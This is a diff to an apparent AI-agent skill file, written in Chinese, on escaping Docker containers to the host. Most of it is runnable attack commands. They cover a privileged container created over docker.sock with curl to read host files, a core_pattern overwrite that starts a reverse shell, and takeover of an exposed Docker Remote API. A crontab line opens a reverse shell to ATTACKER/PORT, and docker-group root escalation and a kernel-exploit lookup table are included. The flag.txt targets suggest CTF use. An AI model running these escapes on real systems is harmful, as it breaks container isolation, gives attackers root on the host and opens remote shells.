@@ -1,8 +1,8 @@
 ---
 name: docker-escape
-description: "Docker 容器逃逸技术。当在 Docker 容器内部需要逃逸到宿主机、发现 docker.sock 挂载、容器以特权模式运行、或需要利用容器配置错误时使用。覆盖特权容器逃逸、socket 逃逸、挂载逃逸、内核漏洞、runc 漏洞、capabilities 滥用。发现容器环境就应使用此技能"
+description: "Docker 容器逃逸技术。当在 Docker 容器内部需要逃逸到宿主机、发现 docker.sock 挂载、容器以特权模式运行、procfs 被挂载、Docker API 端口暴露、或需要利用容器配置错误时使用。覆盖特权容器逃逸、socket 逃逸、procfs 逃逸、Remote API 利用、用户组提权、挂载逃逸、内核漏洞、运行时 CVE、capabilities 滥用。发现容器环境就应使用此技能"
 metadata:
-  tags: "docker,container,escape,逃逸,容器,privileged,docker.sock,cgroup,runc,namespace"
+  tags: "docker,container,escape,逃逸,容器,privileged,docker.sock,cgroup,runc,namespace,procfs,core_pattern,capabilities,dirtycow,dirtypipe"
   category: "cloud"
 ---
 
@@ -37,40 +37,87 @@ uname -r    # 内核版本（宿主机共享）
 ```bash
 # 1. 特权容器？（最简单的逃逸）
 cat /proc/1/status | grep CapEff
-# 0000003fffffffff = 特权容器
+# 0000003fffffffff = 特权容器（拥有全部 capabilities）
 
 # 2. Docker Socket 挂载？
 ls -la /var/run/docker.sock 2>/dev/null
 
-# 3. 宿主机目录挂载？
+# 3. procfs 挂载？（core_pattern 逃逸）
+# 检查是否一个在 /proc 下、一个在其他挂载路径下
+find / -name core_pattern 2>/dev/null
+
+# 4. Docker Remote API 暴露？
+# 推测宿主机 IP：优先 hostname -I 取同网段 .1，为空则用 ip route 默认网关
+GW=$(hostname -I 2>/dev/null | awk '{print $1}' | awk -F. '{print $1"."$2"."$3".1"}')
+[ -z "$GW" ] && GW=$(ip route 2>/dev/null | awk '/default/{print $3}')
+timeout 3 bash -c "echo >/dev/tcp/$GW/2375" 2>/dev/null && echo "DOCKER API EXPOSED on $GW:2375"
+
+# 5. 宿主机目录挂载？
 mount | grep -v 'overlay\|proc\|sys\|cgroup\|tmpfs\|devpts\|mqueue'
 cat /proc/mounts | grep -E '^/dev/'
 
-# 4. 危险 Capabilities？
+# 6. Docker 用户组提权？（宿主机场景）
+groups | grep docker || id | grep docker
+cat /etc/group | grep docker
+
+# 7. 危险 Capabilities？
 cat /proc/1/status | grep Cap
 # python3 解码: python3 -c "import struct;print(bin(struct.unpack('Q',bytes.fromhex('CAPEFF_HEX'))[0]))"
 # 关注: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_OVERRIDE, CAP_NET_ADMIN
 
-# 5. PID namespace 共享？
+# 8. PID namespace 共享？
 ls /proc/*/exe 2>/dev/null | head -20
 # 能看到大量非容器进程 → hostPID=true
 
-# 6. 网络共享？
+# 9. 网络共享？
 ip addr
 # 能看到宿主机网卡(eth0 有宿主机 IP) → hostNetwork=true
+
+# 10. 内核版本（判断可利用的 CVE）
+uname -r
+# 内核版本对照:
+# 2.6.22 - 2016.10修复  → DirtyCow (CVE-2016-5195，几乎所有 2016 年前的内核)
+# 4.6 - 5.9            → CVE-2020-14386
+# >= 5.8 各稳定分支    → DirtyPipe (CVE-2022-0847)
+#   修复版本: 5.16.11, 5.15.25, 5.10.102, 5.4.181
+# 5.8.0 - 5.16         → CVE-2022-23222 (BPF)
+# 2.6.19 - 5.12        → CVE-2021-22555 (Netfilter)
+# Ubuntu 14.04-20.10   → OverlayFS (CVE-2021-3493)
+
+# 11. 环境变量泄露？
+env | sort
+cat /proc/self/environ | tr '\0' '\n'
+
+# 12. docker-compose 配置泄露？
+find / -name "docker-compose*" 2>/dev/null
 ```
 
 ## Phase 3: 逃逸决策树
 
 ```
 检查结果？
-├─ 特权容器 → 挂载宿主机磁盘 / cgroup release_agent / nsenter
-├─ Docker Socket → 创建特权容器逃逸
-├─ hostPath 挂载 → 读写宿主机文件（写 crontab/SSH key）
+├─ 特权容器 → 挂载宿主机磁盘 / cgroup release_agent / nsenter（需 hostPID）
+├─ Docker Socket → 创建特权容器逃逸（docker CLI 或 curl，详见 references）
+├─ procfs 挂载 → core_pattern 管道符反弹 shell
+├─ Docker Remote API 暴露 → 远程创建特权容器
+├─ 宿主机目录挂载
+│   ├─ /etc → 写 crontab/SSH key
+│   └─ 其他目录 → 读写宿主机文件
+├─ Docker 用户组（宿主机用户在 docker 组）→ docker run -v /:/host
 ├─ CAP_SYS_ADMIN → cgroup 逃逸 / mount
 ├─ CAP_SYS_PTRACE + hostPID → 注入宿主机进程
+├─ CAP_DAC_READ_SEARCH → shocker / 配合 DirtyPipe
 ├─ hostNetwork → 访问宿主机服务/Metadata API
-└─ 以上都没有 → 内核漏洞（CVE-2022-0847 等）
+├─ 运行时 CVE（runc/containerd 版本过旧）→ CVE-2019-5736, CVE-2019-16884, CVE-2020-15257
+├─ 信息收集（不直接逃逸但发现关键信息）
+│   ├─ 环境变量 → 可含数据库密码、API Key、云凭证
+│   └─ docker-compose.yml → 可含密码、挂载点、网络配置
+└─ 以上都没有 → 内核漏洞（按版本匹配 CVE）
+    ├─ >= 5.8 未修复  → DirtyPipe (CVE-2022-0847)
+    ├─ 2.6.22+ 2016前 → DirtyCow (CVE-2016-5195)
+    ├─ 5.8-5.16       → BPF 绕过 (CVE-2022-23222)
+    ├─ 2.6.19-5.12    → Netfilter (CVE-2021-22555)
+    └─ Ubuntu 14-20   → OverlayFS (CVE-2021-3493)
 详细命令 → [references/escape-methods.md](references/escape-methods.md)
 ```
 
@@ -85,21 +132,46 @@ cat /tmp/host/root/flag.txt
 
 ### Docker Socket（成功率 95%）
 ```bash
-# 无 docker CLI 时用 curl
-curl -s --unix-socket /var/run/docker.sock \
-  http://localhost/containers/json | head -3
-
-# 创建挂载宿主机的新容器
-curl -s --unix-socket /var/run/docker.sock -X POST \
-  -H "Content-Type: application/json" \
+# 无 docker CLI 时用 curl（完整流程：查镜像 → 创建 → 启动 → 读日志）
+SOCK=/var/run/docker.sock
+IMAGE=$(curl -s --unix-socket $SOCK http://localhost/images/json | python3 -c "import json,sys;imgs=json.load(sys.stdin);print(imgs[0]['RepoTags'][0] if imgs else 'alpine')")
+CID=$(curl -s --unix-socket $SOCK -X POST -H "Content-Type: application/json" \
   http://localhost/containers/create \
-  -d '{"Image":"alpine","Cmd":["cat","/mnt/root/flag.txt"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}'
+  -d "{\"Image\":\"$IMAGE\",\"Cmd\":[\"cat\",\"/mnt/root/flag.txt\"],\"HostConfig\":{\"Binds\":[\"/:/mnt\"],\"Privileged\":true}}" \
+  | python3 -c "import json,sys;print(json.load(sys.stdin)['Id'])")
+curl -s --unix-socket $SOCK -X POST http://localhost/containers/$CID/start
+sleep 2
+curl -s --unix-socket $SOCK "http://localhost/containers/$CID/logs?stdout=true&stderr=true"
+```
+
+### procfs 挂载（core_pattern）
+```bash
+# 前提：宿主机 procfs 已挂载到容器中
+# 找到容器在宿主机的绝对路径（从 upperdir 取父目录拼 /merged）
+upperdir=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/mounts)
+host_path=$(dirname "$upperdir")/merged
+# 写反弹 shell + 覆盖 core_pattern + 触发崩溃
+echo -e "|${host_path}/tmp/.t.py \rcore " > /host/proc/sys/kernel/core_pattern
+```
+
+### Docker Remote API
+```bash
+# 获取宿主机 IP（优先 hostname -I 推测，为空则用 ip route 网关）
+GW=$(hostname -I 2>/dev/null | awk '{print $1}' | awk -F. '{print $1"."$2"."$3".1"}')
+[ -z "$GW" ] && GW=$(ip route 2>/dev/null | awk '/default/{print $3}')
+docker -H tcp://$GW:2375 run -v /:/mnt -it alpine chroot /mnt bash
 ```
 
 ### 写 Crontab 逃逸
 ```bash
 # 如果挂载了 /etc 或 /var/spool/cron
 echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'" > /host_etc/cron.d/pwn
+```
+
+### Docker 用户组提权（宿主机场景）
+```bash
+# 当前用户在 docker 组即可
+docker run -v /:/host -it alpine chroot /host sh
 ```
 
 ## 工具
